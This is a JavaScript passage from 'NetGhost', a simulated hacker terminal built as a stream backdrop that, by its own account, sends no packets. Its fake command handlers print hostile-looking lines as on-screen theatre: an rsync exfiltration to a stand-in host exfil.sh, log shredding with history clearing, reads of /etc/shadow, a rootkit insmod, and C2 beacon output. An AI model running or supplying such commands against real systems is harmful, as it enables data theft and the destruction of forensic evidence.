function missionBar(p){const n=16,on=Math.round(Math.max(0,Math.min(1,p))*n);return "["+"█".repeat(on)+"·".repeat(n-on)+"]";}
function missionStatus(){
  if(!W.mission){ wl(dim("no active mission — ")+wht("mission start")+dim(" to begin")+"\n"); return; }
  const m=W.mission, v=Math.min(m.target,m.metric()), p=v/m.target;
  wl(amber("▣ "+m.name)+dim(" · "+m.goal)); wl(fg("  "+missionBar(p))+dim(`  ${v}/${m.target}  ·  score ${W.score}`)); wl("");
}
function missionTick(){
  if(IS_MON||W.paused||!active()||!W.mission)return;
  const m=W.mission, v=m.metric(), p=v/m.target;
  if(!m.half&&p>=0.5){ m.half=true; wl(cyan("▣ "+m.name)+dim(" — halfway ")+fg(missionBar(p))); }
  if(v>=m.target){
    W.score+=m.pts;
    wl("");wl(pri("✔ MISSION COMPLETE ")+wht(m.name)+dim("  +"+m.pts+" pts  ·  total ")+pri(W.score));wl("");
    startMission(m.idx+1);
  }
}
function missionCmd(a){
  const sub=(a[0]||"").toLowerCase();
  if(sub==="skip"){ startMission(W.mission?W.mission.idx+1:0); return; }
  if(sub==="start"){ startMission(0); return; }
  if(sub==="list"){ MISSIONS.forEach(m=>wl("  "+pri(pad(m.name,9))+dim(m.goal+"  +"+m.pts))); wl(""); return; }
  if(!W.mission){ startMission(0); return; }
  missionStatus();
}

/* ============================================================================
   COMMANDS
   ========================================================================== */
const HELP=[["help","this list"],["ghost v_start3","begin the ambient stream"],["ghost v_stop3","halt the stream (idle)"],
  ["scan [ip]","nmap-style sweep"],["nmap <ip>","alias for scan"],["ping [ip]","icmp echo"],
  ["trace [ip]","route via proxy chain"],["hydra [ip]","credential audit"],["sniff","dump packets"],["syslog","tail log feed"],
  ["scene <id>","switch scene (recon/redteam/ddos/soc/ghostnet)"],["ghost","toggle auto-ghost"],["targets","list hosts"],
  ["hops","rebuild proxy chain"],["setup","open config"],["reseed [n]","regen world"],["pause","freeze streams"],
  ["theme <id>","phosphor colour"],["speed <id>","stream rate"],["pkg <cmd>","plugins: list/install/remove"],
  ["agent [topic]","AI/sim analyst report"],["ask / explain <q>","ask the ghost a question"],
  ["port","open a monitor pop-out"],["port close","close a pop-out"],["kiosk","toggle stream chrome"],["obs","stream/OBS params"],
  ["map","open the world attack map"],["mission","objectives + score"],["director <on/off>","auto-rotate scenes"],
  ["attack [ip]","full offensive chain on a host"],["pull [ip]","intel dossier on a host"],["bank","financial access (sim)"],
  ["exfil","exfiltrate files"],["hashcat [hash]","hash cracking"],["geoip [ip]","geolocate an ip"],["whois [ip]","whois lookup"],
  ["wipe","clear tracks / logs"],["beacon","C2 beacon feed"],["secure","fight back / lower threat"],
  ["ddos [ip]","volumetric flood"],["inject [ip]","payload injection"],["rootkit","install rootkit"],
  ["spray","password spray"],["keylog","keystroke capture"],["netstat","connection table"],["ps","process list"],
  ["cams","CCTV grid (live video)"],["spy [ip]","single webcam popup"],["vault","data-heist popup"],["alert","breach-alert popup"],["matrix","enter the matrix"],
  ["reset","restore default settings"],["full","fullscreen"],["clear","wipe screen"],["about","what this is"]];
function isIp(s){return /^\d{1,3}(\.\d{1,3}){3}$/.test(s||"");}
function findMake(ip){let t=W.targets.find(x=>x.ip===ip);if(!t){t=makeTarget();if(isIp(ip))t.ip=ip;W.targets.push(t);renderTopo();}return t;}
/* ============================================================================
   EXTRA BUILT-IN COMMANDS (no plugin needed)
   ========================================================================== */
const BANKS=["Meridian Trust","Nullsec Credit Union","Gray Line Bank","Orbital Savings","Vexcorp Financial","Iron Gate Holdings"];
const CITIES=[["Reykjavík","IS"],["Zürich","CH"],["Singapore","SG"],["Ashburn VA","US"],["Amsterdam","NL"],["São Paulo","BR"],["Tokyo","JP"],["Bucharest","RO"]];
const XORGS=["nortech","umbranet","cygnus","helix-dyn","blackmesa","orbital","grayline","meridian","vexcorp","nullsec","irongate"];
const CAM_VIDS=["D4c0UTnNXDM"]; // stock CCTV footage played in the cams popup
function money(){ return "$"+R.i(1,9)+","+String(R.i(0,999)).padStart(3,"0")+","+String(R.i(0,999)).padStart(3,"0"); }
function doAttack(ip){
  const t=ip&&isIp(ip)?findMake(ip):(R.pick(W.targets)||makeTarget());
  wl("");wl(red("▓▓ LAUNCHING ATTACK ")+wht(t.host)+dim(" ("+t.ip+")")+red(" ▓▓"));wl("");
  GEN.nmap(t); GEN.hydra(t); GEN.privesc(t);
  wl(red("▓▓ ")+wht(t.host)+pri(" OWNED")+dim(" — root shell, persistence installed"));
  t.breached=true;renderTopo();pushThreat("crit","attack chain owned "+t.host);wl("");
}
function pullInfo(ip){
  const t=ip&&isIp(ip)?findMake(ip):(R.pick(W.targets)||makeTarget()); const c=R.pick(CITIES);
  wl(cyan("╒═ INTEL DOSSIER ")+wht(t.host)+cyan(" ═"));
  wl(dim("  ip     ")+fg(pad(t.ip,16))+dim(" os    ")+fg(t.os));
  wl(dim("  geoip  ")+fg(pad(c[0]+", "+c[1],16))+dim(" mac   ")+fg(mac()));
  wl(dim("  isp    ")+fg(R.pick(["GhostHost","NullNet","Orbital Telecom","Gray Fiber"])));
  wl(dim("  open   ")+fg(t.ports.filter(p=>p.state==="open").map(p=>p.p+"/"+p.svc).join("  ")||"none"));
  wl(dim("  users  ")+fg(R.shuffle(USERS).slice(0,R.i(2,4)).join(", ")));
  wl(dim("  loot   ")+amber(R.pick(["backup drive mounted","admin panel exposed","plaintext creds in /tmp","db dump in home dir","VPN keys readable"])));
  wl("");
}
function bankFeed(){
  wl(amber("╒═ FINANCIAL ACCESS ")+dim("· SIMULATION ·")+amber(" ═"));
  for(let i=0;i<R.i(3,5);i++)
    wl(dim("  ACCT ")+fg("****-****-"+R.i(1000,9999))+dim("  "+pad(R.pick(BANKS),22))+dim("bal ")+pri(money()));
  if(R.chance(.65)){ const amt="$"+R.i(5,900)+",000"; wl(red("  ⇒ WIRE ")+wht(amt)+dim(" → shell acct ****-"+R.i(1000,9999)+" (offshore)")); pushThreat("crit","unauthorized wire "+amt); }
  wl(dim("  [fictional accounts · no real funds, cards, or institutions]"));wl("");
}
function exfilCmd(){
  wl(cyan("$ ")+wht("rsync -azq /mnt/vault ghost@exfil.sh:/loot"));
  R.shuffle(["payroll_2026.xlsx","customers.db","id_rsa","secrets.env","backups.tar.gz","emails.pst","blueprints.pdf"]).slice(0,R.i(3,5))
    .forEach(f=>wl(dim("  ")+fg(pad(f,22))+dim(R.i(1,900)+" MB  ")+pri("sent")));
  wl(pri("  "+R.i(2,40)+" GB exfiltrated")+dim(" via encrypted tunnel"));wl("");
}
function crackCmd(h){
  wl(dim("$ ")+wht("hashcat -m 1800 "+(h||R.hex(32))+" rockyou.txt"));
  wl(dim("Status: Running   Speed: "+R.i(100,9000)+" MH/s"));
  for(let i=0;i<R.i(2,4);i++)wl(dim("  "+R.hex(32)+" : ")+(R.chance(.55)?fg(R.pick(PWLIST)):dim("[running]")));
  wl(pri("Recovered: "+R.i(1,8)+"/"+R.i(8,40)+" hashes"));wl("");
}
function geoipCmd(ip){ ip=isIp(ip)?ip:randIP(); const c=R.pick(CITIES);
  wl(cyan("geoip ")+fg(ip));
  wl(dim("  "+c[0]+", "+c[1]+"  ·  lat "+R.i(-89,89)+"."+R.i(0,999)+"  lon "+R.i(-179,179)+"."+R.i(0,999)));
  wl(dim("  ISP "+R.pick(["GhostHost","NullNet","Orbital Telecom"])+"  ·  ASN AS"+R.i(1000,65000)));wl("");
}
function whoisCmd(ip){ ip=isIp(ip)?ip:randIP(); const base=ip.split(".").slice(0,3).join(".");
  wl(dim("$ ")+wht("whois "+ip));
  wl(dim("  NetRange  ")+fg(base+".0 - "+base+".255"));
  wl(dim("  Org       ")+fg(R.pick(XORGS))); wl(dim("  Country   ")+fg(R.pick(CITIES)[1]));
  wl(dim("  Abuse     ")+fg("abuse@"+R.pick(["ghosthost","nullnet","orbital"])+".net"));wl("");
}
function wipeCmd(){
  wl(dim("$ ")+wht("shred -uz /var/log/*.log; history -c; unset HISTFILE"));
  ["auth.log","syslog","wtmp","btmp","audit.log",".bash_history"].forEach(f=>wl(dim("  wiping ")+pad(f,16)+pri("gone")));
  wl(amber("  tracks cleared ")+dim("— no forensic trail left"));wl("");
}
function beaconCmd(){
  for(let i=0;i<R.i(3,5);i++)
    wl(dim(new Date().toTimeString().slice(0,8)+" ")+cyan("[C2] ")+dim("beacon ")+fg(privIP())+dim(" → c2.ghost.sh  sleep "+R.i(30,300)+"s  jitter "+R.i(5,40)+"%  "+R.pick(["task: none","task: screenshot","task: keylog","task: shell","checking in"])));
  wl("");
}

/* ---- visual pop-ups (overlays, not pop-out windows) ---- */
let popTimer=null;
function openPop(title,html,cls){
  document.getElementById("poptitle").textContent=title;
  document.getElementById("popbody").innerHTML=html;
  const dlg=document.getElementById("popdlg"); dlg.className=""; if(cls)dlg.classList.add(cls);
  document.getElementById("popwrap").classList.add("show");
}
function closePop(){ document.getElementById("popwrap").classList.remove("show"); if(popTimer){clearInterval(popTimer);popTimer=null;} document.getElementById("popbody").innerHTML=""; term.focus(); }
function camTile(name,vid,st){
  return `<div class="camtile"><iframe src="https://www.youtube-nocookie.com/embed/${vid}?autoplay=1&mute=1&controls=0&loop=1&playlist=${vid}&start=${st}&modestbranding=1&playsinline=1&rel=0" allow="autoplay; encrypted-media" referrerpolicy="origin" frameborder="0"></iframe><div class="scan"></div><div class="lbl">${name}</div><div class="rec">● REC</div><div class="ts">${new Date().toTimeString().slice(0,8)}</div></div>`;
}
function camsPop(){
  const names=["VAULT-CAM-03","LOBBY-02","SERVER-RM-01","PARKING-07","ELEVATOR-04","LOADING-09","ROOF-01","CORRIDOR-05","DATA-HALL-02"];
  const tiles=R.shuffle(names).slice(0,6).map(n=>
    R.chance(.15)?`<div class="camtile lost">▞ SIGNAL LOST ▞</div>`:camTile(n,R.pick(CAM_VIDS),R.i(0,500))
  ).join("");
  openPop("CCTV // "+R.i(6,32)+" FEEDS", `<div class="camgrid">${tiles}</div>`);
  popTimer=setInterval(()=>document.querySelectorAll("#popbody .ts").forEach(e=>e.textContent=new Date().toTimeString().slice(0,8)),1000);
}
function webcamPop(ip){
  ip=isIp(ip)?ip:((R.pick(W.targets)||{}).ip||privIP());
  openPop("WEBCAM // "+ip, `<div class="camgrid single">${camTile("CAM-0 · "+ip,R.pick(CAM_VIDS),R.i(0,400))}</div>`);
}
function vaultPop(){
  const files=[["payroll_2026.xlsx","4.2 MB"],["customers.db","1.1 GB"],["id_rsa","3 KB"],["secrets.env","12 KB"],["backups.tar.gz","8.7 GB"],["emails.pst","2.3 GB"],["blueprints.pdf","44 MB"],["research.7z","910 MB"]];
  const rows=R.shuffle(files).slice(0,6).map(f=>`<div class="vrow"><span class="vn">${f[0]}</span><span class="vs">${f[1]}</span><div class="vbar"><i></i></div></div>`).join("");
  openPop("EXFIL // VAULT  (simulation)", rows);
  popTimer=setInterval(()=>{let done=true;document.querySelectorAll("#popbody .vbar i").forEach(b=>{let w=parseFloat(b.style.width)||0;if(w<100){b.style.width=Math.min(100,w+R.i(5,24))+"%";done=false;}});if(done){clearInterval(popTimer);popTimer=null;}},300);
}
function breachPop(){
  openPop("⚠ ALERT", `<div class="breachbox"><div class="bt">SYSTEM BREACHED</div><div class="bs">ROOT ACCESS GRANTED · ALL SYSTEMS COMPROMISED</div><div class="bn">(simulation — press Esc or click away)</div></div>`,"breach");
  pushThreat("crit","system breach alert");
}

/* ---- DEFENSE: secure command that fights back and lowers the threat ---- */
function secureCmd(){
  wl("");wl(pri("▣ DEFENSE GRID ")+dim("— countermeasures engaging…"));
  for(let i=0;i<R.i(3,6);i++){ const res=R.chance(.75)?pri("BLOCKED"):amber("quarantined");
    wl(red("  ⚔ inbound ")+fg(pad(randIP(),16))+dim(R.pick(["port scan","brute force","exploit probe","C2 callback","SQLi attempt"])+" → ")+res); }
  const c=R.pick(CITIES);
  wl(cyan("  ↩ counter-trace ")+dim("→ attacker at ")+fg(randIP())+dim(" ("+c[0]+", "+c[1]+")"));
  if(R.chance(.55))wl(pri("  ⚡ counter-strike ")+dim("→ ")+wht("attacker node disabled"));
  wl(pri("  ✓ "+R.i(4,24)+" threats neutralized")+dim(" · firewall hardened · IDS armed"));
  W.threatScore=Math.max(0,W.threatScore-R.i(25,50)); renderThreat();
  wl("");
}
/* ---- more built-in commands ---- */
function netstatCmd(){ wl(dim("$ ")+wht("netstat -antp"));
  wl(dim("Proto  Local                Foreign              State"));
  for(let i=0;i<R.i(5,8);i++)wl(dim("tcp    "+pad(privIP()+":"+R.i(1024,65535),21)+pad(randIP()+":"+R.pick([443,22,80,4444,8443]),21))+fg(R.pick(["ESTABLISHED","TIME_WAIT","LISTEN","SYN_SENT","CLOSE_WAIT"])));
  wl(""); }
function psCmd(){ wl(dim("$ ")+wht("ps aux | grep -v grep"));
  const procs=["ghostd","beacon","nmapd","exfil","keymon","rootkit","c2agent","sshd","hashcat"];
  for(let i=0;i<R.i(5,8);i++)wl(dim("root  "+pad(R.i(100,9999),6)+pad((R.i(0,400)/10).toFixed(1)+"%",6)+pad(R.i(1,900)+"M",7))+fg("/usr/sbin/"+R.pick(procs)));
  wl(""); }
function ddosCmd(ip){ ip=isIp(ip)?ip:privIP(); wl(red("▓ DDoS ")+wht(ip)+dim(" — "+R.i(10,50)+"k-node botnet"));
  for(let i=0;i<R.i(3,5);i++)wl(amber("  "+R.i(2,90)+" Gbps ")+dim(R.pick(["SYN flood","UDP flood","HTTP flood","DNS amp","slowloris"])+" → "+ip+":"+R.pick([80,443])));
  wl(red("  target ")+wht(R.pick(["UNREACHABLE","timing out","degraded","offline"]))); pushThreat("high","DDoS on "+ip); wl(""); }
function injectCmd(ip){ const t=isIp(ip)?findMake(ip):(R.pick(W.targets)||makeTarget());
  wl(dim("$ ")+wht("inject --payload ghost.bin "+t.ip));
  wl(dim("  staging payload ...... ")+pri("done")); wl(dim("  bypassing ASLR/DEP ... ")+pri("ok"));
  wl(pri("  ⟹ payload executed on ")+wht(t.host)+dim(" — reverse shell live")); t.breached=true;renderTopo();pushThreat("crit","payload injected "+t.host); wl(""); }
function rootkitCmd(){ wl(dim("$ ")+wht("insmod ghostkit.ko"));
  ["hiding PID 0x"+R.hex(4),"hooking syscall table","masking /proc entries","persisting via initramfs","disabling audit daemon"].forEach(s=>wl(dim("  "+pad(s,30))+pri("ok")));
  wl(pri("  rootkit resident ")+dim("— invisible to ps, lsmod, netstat")); wl(""); }
function sprayCmd(){ wl(dim("$ ")+wht("spray --users all --pass "+R.pick(["Autumn2026!","Welcome1","Company@123"])));
  const hosts=W.targets.map(t=>t.host).concat(["corp.lan","vpn.lan"]);
  for(let i=0;i<R.i(4,7);i++)wl(dim("  "+pad(R.pick(USERS)+"@"+R.pick(hosts),30))+(R.chance(.18)?pri("VALID"):dim("fail")));
  wl(dim("  sprayed "+R.i(40,900)+" accounts · "+R.i(0,6)+" hit(s)")); wl(""); }
function keylogCmd(){ wl(cyan("[KEYLOG] ")+dim("capturing "+((R.pick(W.targets)||{host:"host"}).host)));
  const snips=["sudo su -","ssh admin@10.x","cat /etc/shadow","password: ********","mysql -u root -p****","scp loot.tgz ghost@","rm -rf ~/.bash_history","export AWS_SECRET=****"];
  R.shuffle(snips).slice(0,R.i(3,5)).forEach(s=>wl(dim("  "+new Date().toTimeString().slice(0,8)+"  ")+fg(s)));
  wl(""); }

/* ---- MATRIX rain overlay ---- */
let mRAF=null,mCan=null,mCtx=null,mDrops=[];
function startMatrix(){
  if(mCan)return;
  mCan=document.createElement("canvas"); mCan.id="matrixcanvas";
  mCan.style.cssText="position:fixed;inset:0;z-index:90;pointer-events:none;background:rgba(2,4,3,.82)";
  document.body.appendChild(mCan);
  const resize=()=>{mCan.width=innerWidth;mCan.height=innerHeight;mDrops=Array(Math.max(1,Math.floor(innerWidth/14))).fill(0).map(()=>Math.floor(Math.random()*innerHeight/14));};
  resize(); mCan._resize=resize; addEventListener("resize",resize);
  mCtx=mCan.getContext("2d");
  const CH="アカサタナハマ0123456789ABCDEF<>/\\*#".split("");
  let last=0;
  const loop=(ts)=>{ mRAF=requestAnimationFrame(loop);
    if(ts-last<48)return; last=ts;
    mCtx.fillStyle="rgba(2,4,3,.09)"; mCtx.fillRect(0,0,mCan.width,mCan.height);
    mCtx.font="14px monospace";
    const hex="#"+PRI.map(x=>x.toString(16).padStart(2,"0")).join("");
    for(let i=0;i<mDrops.length;i++){ const x=i*14, y=mDrops[i]*14;
      mCtx.fillStyle=Math.random()<0.02?"#eafff7":hex; mCtx.fillText(CH[Math.floor(Math.random()*CH.length)],x,y);
      mDrops[i]=(y>mCan.height&&Math.random()>0.975)?0:mDrops[i]+1; }
  };
  mRAF=requestAnimationFrame(loop);
  wl(pri("entered the matrix")+dim(" — type 'matrix' or press Esc to exit")+"\n");
}
function stopMatrix(){ if(!mCan)return; cancelAnimationFrame(mRAF); removeEventListener("resize",mCan._resize); mCan.remove(); mCan=null;mCtx=null; }
function toggleMatrix(){ mCan?stopMatrix():startMatrix(); }

function runCmd(raw){
  const p=raw.trim().split(/\s+/),c=(p[0]||"").toLowerCase(),a=p[1];
  wl(PROMPT()+wht(raw));
  switch(c){
    case"":break;
    case"help":case"?":HELP.forEach(h=>wl("  "+pri(pad(h[0],20))+dim(h[1])));wl("");break;
    case"about":
      wl(pri("NetGhost")+wht(" — ambient network & security terminal engine."));
      wl(dim("Every byte on screen is procedurally generated theatre. It contacts no"));
      wl(dim("real hosts and sends no packets. Built as a monitor / stream backdrop."));
      wl(dim("By Apoji_Delegraphics · a networking solution for all."));wl("");break;
    case"scan":case"nmap":GEN.nmap(a?findMake(a):undefined);break;
    case"ping":GEN.ping(isIp(a)?a:undefined);break;
    case"trace":case"traceroute":GEN.trace(isIp(a)?a:undefined);break;
    case"hydra":case"crack":GEN.hydra(a?findMake(a):undefined);break;
    case"sniff":case"tcpdump":for(let i=0;i<dn(3,6);i++)GEN.tcpdump();break;
    case"syslog":case"tail":for(let i=0;i<dn(6,10);i++)GEN.syslog();break;
    case"scene":if(SCENES[a]){setScene(a);syncCfg();}else wl(red("unknown scene — try recon/redteam/ddos/soc/ghostnet")+"\n");break;
    case"theme":if(THEMES[a]){applyTheme(a);syncCfg();wl(pri("theme → "+a)+"\n");}else wl(red("themes: green amber cyan clash mono")+"\n");break;
    case"speed":if(SPEEDS[a]){W.speed=a;startClocks();syncCfg();wl(pri("speed → "+a)+"\n");}else wl(red("speed: slow normal fast overdrive")+"\n");break;
    case"start":case"go":case"run":startStream();break;
    case"stop":case"halt":stopStream();break;
    case"ghost":
      if((a||"").toLowerCase()==="v_start3")startStream();
      else if((a||"").toLowerCase()==="v_stop3")stopStream();
      else toggleGhost();
      break;
    case"targets":case"ls":
      if(!W.targets.length)wl(dim("no targets yet — run scan"));
      W.targets.forEach(t=>wl("  "+blue(pad(t.ip,16))+wht(pad(t.host,26))+dim(pad(t.os,20))+(t.breached?red("BREACHED"):pri(t.ports.filter(x=>x.state==="open").length+" open"))));
      wl("");break;
    case"hops":rebuildHops();wl(pri("proxy chain rebuilt — "+W.hops.length+" hops")+"\n");break;
    case"setup":case"config":openCfg();break;
    case"reseed":reseed(a?parseInt(a):undefined);break;
    case"pause":togglePause();wl(amber(W.paused?"streams frozen":"streams resumed")+"\n");break;
    case"full":case"fullscreen":goFull();break;
    case"clear":case"cls":term.clear();break;
    case"whoami":wl(pri("ghost (uid=0)")+dim(" — anonymized via "+W.hops.length+" hops")+"\n");break;
    case"pkg":case"brew":case"plugin":case"plugins":pkg(p.slice(1));break;
    case"reset":case"defaults":resetCfg();wl(pri("settings reset")+dim(" — defaults restore on next launch")+"\n");break;
    case"agent":case"ask":case"report":aiAgent(p.slice(1).join(" "),false);break;
    case"explain":case"why":aiAgent((c==="why"?"why ":"explain ")+p.slice(1).join(" "),false);break;
    case"kiosk":toggleKiosk();wl(dim("kiosk "+(document.body.classList.contains("kiosk")?"on — press Esc for setup":"off"))+"\n");break;
    case"obs":case"stream":obsHelp();break;
    case"map":case"worldmap":openMap();break;
    case"attack":case"hit":case"strike":doAttack(a);break;
    case"pull":case"pullinfo":case"info":case"intel":pullInfo(isIp(a)?a:undefined);break;
    case"bank":case"banking":case"heist":bankFeed();break;
    case"exfil":case"loot":exfilCmd();break;
    case"hashcat":case"hash":crackCmd(a);break;
    case"geoip":case"locate":geoipCmd(a);break;
    case"whois":whoisCmd(a);break;
    case"wipe":case"cleanup":case"coverts":wipeCmd();break;
    case"beacon":case"c2":beaconCmd();break;
    case"cams":case"cctv":camsPop();break;
    case"spy":case"webcam":webcamPop(a);break;
    case"vault":case"files":vaultPop();break;
    case"alert":case"breachscreen":breachPop();break;
    case"secure":case"defend":case"fortify":case"counter":secureCmd();break;
    case"netstat":case"connections":netstatCmd();break;
    case"ps":case"proc":psCmd();break;
    case"ddos":case"flood":ddosCmd(a);break;
    case"inject":case"payload":injectCmd(a);break;
    case"rootkit":case"backdoor":rootkitCmd();break;
    case"spray":case"passwordspray":sprayCmd();break;
    case"keylog":case"keylogger":keylogCmd();break;
    case"matrix":case"rain":toggleMatrix();break;
    case"port":case"pop":case"popout":
      if((a||"").toLowerCase()==="close")portClose();
      else{popOut();wl(dim("opening a port — new monitor window")+"\n");}
      break;
    case"close":portClose();break;
    case"mission":case"missions":missionCmd(p.slice(1));break;
    case"director":
      W.director=((a||"").toLowerCase()!=="off");
      wl(W.director?cyan("▷ director on")+dim(" — scenes rotate every 90s"):dim("director off"));wl("");
      syncCfg();break;
    default:
      if(PCMDS[c]){try{PCMDS[c].fn(p.slice(1),window.NetGhost.api);}catch(e){wl(red("plugin error: ")+dim(e.message)+"\n");}break;}
      wl(red("ghost: ")+dim(`command not found: ${c}  (try 'help' or 'pkg list')`)+"\n");
  }
}

/* ============================================================================
   CONTROLS
   ========================================================================== */
function toggleGhost(){
  W.ghost=!W.ghost;
  document.getElementById("b-ghost").classList.toggle("on",W.ghost);
  document.getElementById("b-ghost").classList.toggle("amberon",W.ghost);
  document.getElementById("ghosttag").classList.toggle("show",W.ghost);
  document.getElementById("s-link").textContent=W.ghost?"ENGAGED":"GHOST";
  W.queue=[];
  wl("");wl(W.ghost?amber("╔══ AUTO-GHOST ENGAGED ")+dim("— autonomous sequences queued ══╗"):dim("── auto-ghost disengaged — manual control ──"));wl("");
  if(W.ghost&&!W.mission)startMission(0);
  syncCfg();
}
function togglePause(){
  W.paused=!W.paused;
  const b=document.getElementById("b-pause");b.classList.toggle("on",W.paused);b.textContent=W.paused?"▶Run":"⏸Hold";
}
function startStream(){ if(W.streaming){wl(dim("stream already running")+"\n");return;} W.streaming=true;
  document.getElementById("s-link").textContent=W.ghost?"ENGAGED":"LIVE";
  wl("");wl(pri("▶ STREAM STARTED ")+dim("— ambient feed is live.  'ghost v_stop3' to halt · 'ghost' for Auto-Ghost"));wl("");
  if(!W.mission)startMission(0); }
function stopStream(){ W.streaming=false; W.queue=[];
  if(!W.ghost)document.getElementById("s-link").textContent="GHOST";
  wl("");wl(dim("■ stream stopped — idle.  type ")+wht("ghost v_start3")+dim(" to resume"));wl(""); }
function reseed(n){
  SEED=(n!=null&&!isNaN(n))?n>>>0:(Math.random()*1e9)>>>0;rng=mulberry32(SEED);
  W.targets=[];W.threats=[];W.threatScore=0;W.queue=[];
  ensureTargets(R.i(5,9));rebuildHops();renderTopo();renderThreat();
  wl("");wl(pri("⟳ world reseeded → ")+blue("0x"+SEED.toString(16)));wl("");
}
function applyTheme(id){
  const th=THEMES[id]||THEMES.green;PRI=th.rgb.slice();
  Object.entries(th.vars).forEach(([k,v])=>document.documentElement.style.setProperty(k,v));
  const hex="#"+th.rgb.map(x=>x.toString(16).padStart(2,"0")).join("");
  term.options.theme={...term.options.theme,cursor:hex,foreground:th.vars['--fg']||"#cdd0c0"};
  document.getElementById("flick").style.background=hex;
  W.theme=id;
}
function goFull(){
  if(window.netghost&&window.netghost.toggleFullscreen){window.netghost.toggleFullscreen();return;}
  const el=document.documentElement;
  if(!document.fullscreenElement)(el.requestFullscreen||el.webkitRequestFullscreen||function(){}).call(el);
  else (document.exitFullscreen||document.webkitExitFullscreen||function(){}).call(document);
}
function popOut(){
  if(window.netghost&&window.netghost.popout){window.netghost.popout();return;}
  const base=location.href.split("#")[0];
  const w=window.open(base+"#monitor","netghost_mon_"+R.i(1,9999),"width=1280,height=720");
  if(!w)wl(amber("[!] ")+dim("pop-out blocked — allow popups for a second-monitor view")+"\n");
}
function portClose(){
  if(IS_MON){ try{window.close();}catch(e){} return; }
  const victims=Object.keys(WINS).filter(id=>id!==WIN_ID);
  if(!victims.length){ wl(dim("no pop-out ports open to close")+"\n"); return; }
  sendSync({t:"closewin",id:victims[victims.length-1]});
  wl(dim("closing a pop-out port…")+"\n");
}

/* ============================================================================
   CONFIG PERSISTENCE  (localStorage — works in Electron renderer & browser)
   ========================================================================== */
const CFG_KEY="netghost.cfg.v1";
function saveCfg(){
  try{
    localStorage.setItem(CFG_KEY,JSON.stringify({
      theme:W.theme, scene:W.scene, speed:W.speed, density:W.density,
      scan:!document.body.classList.contains("noscan"),
      grime:!document.body.classList.contains("nogrime"),
      flicker:!document.body.classList.contains("noflicker"),
      pluginsAuto:W.pluginsAuto,
      director:W.director,
      sweepExclude:W.sweepExclude,
      plugins:Object.keys(ENABLED)
    }));
  }catch(e){}
}
function loadCfg(){ try{return JSON.parse(localStorage.getItem(CFG_KEY)||"null");}catch(e){return null;} }
function resetCfg(){ try{localStorage.removeItem(CFG_KEY);}catch(e){} }

/* ============================================================================
   PLUGIN SYSTEM  +  homebrew-style package manager
   A plugin may contribute: commands{}, scenes{}, themes{}, onEnable/onDisable.
   Register from plugins.js (or your own file) via window.NetGhost.registerPlugin.
   ========================================================================== */
const PLUGINS={};   // id -> def (catalog, available)
const ENABLED={};   // id -> def (currently installed/active)
const PCMDS={};     // command name -> {fn, plugin}
window.NetGhost={
  version:"1.0",
  registerPlugin(def){ if(def&&def.id) PLUGINS[def.id]=def; },
  list(){ return Object.keys(PLUGINS); },
  /* primitives plugins draw with */
  api:{ wl,pri,dim,fg,wht,cyan,amber,red,mag,blue,pad,A,RGB,R,q,
        pushThreat,makeTarget,host,randIP,privIP,W,SERVICES,PORTLIST,USERS,
        popout:()=>popOut(),
        get PRIMARY(){return PRI;} }
};
function enablePlugin(id,quiet){
  const d=PLUGINS[id]; if(!d||ENABLED[id])return false;
  if(d.scenes)for(const k in d.scenes)SCENES[k]=d.scenes[k];
  if(d.themes)for(const k in d.themes)THEMES[k]=d.themes[k];
  if(d.commands)for(const k in d.commands)PCMDS[k.toLowerCase()]={fn:d.commands[k],plugin:id};
  ENABLED[id]=d;
  if(d.onEnable)try{d.onEnable(window.NetGhost.api);}catch(e){}
  if(!quiet)wl(pri("[pkg] ")+wht(d.name)+dim(" installed"+(d.commands?"  commands: "+Object.keys(d.commands).join(" "):"")));
  saveCfg();
  return true;
}
function disablePlugin(id){
  const d=ENABLED[id]; if(!d)return false;
  if(d.scenes)for(const k in d.scenes){ if(W.scene===k)setScene("ghostnet",true); delete SCENES[k]; }
  if(d.themes)for(const k in d.themes){ if(W.theme===k)applyTheme("green"); delete THEMES[k]; }
  if(d.commands)for(const k in d.commands)delete PCMDS[k.toLowerCase()];
  if(d.onDisable)try{d.onDisable();}catch(e){}
  delete ENABLED[id]; saveCfg();
  return true;
}
function pkg(args){
  if(!args.length){openPkg();return;}   // bare 'pkg' opens the clickable store
  const sub=(args[0]||"list").toLowerCase(), id=args[1];
  if(sub==="list"||sub==="ls"){
    wl(pri("NetGhost package registry")+dim("   pkg install <id> · pkg remove <id> · pkg info <id>"));
    const ids=Object.keys(PLUGINS);
    if(!ids.length)wl(dim("  (no packages registered)"));
    ids.forEach(k=>{const p=PLUGINS[k];wl("  "+(ENABLED[k]?pri("[✓] "):dim("[ ] "))+wht(pad(p.id,13))+dim(p.desc));});
    wl(""); return;
  }
  if(sub==="info"){ const p=PLUGINS[id]; if(!p){wl(red("no such package: "+(id||""))+"\n");return;}
    wl(pri(p.name)+dim("  ("+p.id+")")); wl(dim("  "+p.desc));
    if(p.commands)wl(dim("  commands: ")+fg(Object.keys(p.commands).join(" ")));
    if(p.scenes)wl(dim("  scenes:   ")+fg(Object.keys(p.scenes).join(" ")));
    if(p.themes)wl(dim("  themes:   ")+fg(Object.keys(p.themes).join(" ")));
    wl(dim("  status:   ")+(ENABLED[id]?pri("installed"):dim("available"))); wl(""); return;
  }
  if(sub==="install"||sub==="add"||sub==="i"){
    if(!PLUGINS[id]){wl(red("no such package: "+(id||""))+dim("   (try 'pkg list')")+"\n");return;}
    if(ENABLED[id]){wl(dim(id+" is already installed")+"\n");return;}
    wl(dim("==> Fetching ")+wht(id)); wl(dim("==> Pouring ")+wht(id)+dim(" into ghost-core…"));
    enablePlugin(id); wl(pri("[beer] ")+fg(id+" installed")+dim("  — enabled & saved")); wl(""); return;
  }
  if(sub==="remove"||sub==="rm"||sub==="uninstall"){
    if(disablePlugin(id))wl(dim("==> Uninstalling "+id)+"  "+pri("done")+"\n");
    else wl(red((id||"")+" is not installed")+"\n");
    return;
  }
  wl(dim("pkg: list · info <id> · install <id> · remove <id>")+"\n");
}

/* ============================================================================
   AI AGENTS (optional OpenRouter)  +  STREAM / OBS modes
   AI is OFF by default. When enabled with a key, agents call OpenRouter;
   otherwise they emit a simulated report. The key lives only in localStorage.
   ========================================================================== */
const AI_LS="netghost.ai.v1";
W.ai={enabled:false,key:"",model:"openai/gpt-4o-mini"};
W.aiCalls=[];         // timestamps of auto AI calls (rate-limited to 2/hr)
W.pluginsAuto=true;   // let installed plugins run inside Auto-Ghost (ghostnet)
W.sweepExclude=[];    // plugin ids excluded from the minute plugin sweep
